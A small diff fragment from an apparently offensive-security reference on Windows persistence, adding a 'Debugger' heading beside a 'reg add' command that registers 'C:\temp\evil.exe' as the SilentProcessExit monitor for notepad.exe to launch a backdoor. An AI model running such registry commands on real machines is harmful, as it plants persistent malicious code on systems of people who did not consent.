@@ -310,6 +310,8 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\not
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"
 ```
 
+#### Debugger
+
 You can also abuse this to run your backdoor whenever Notepad.exe is opened with two registry keys:
 
 ```text
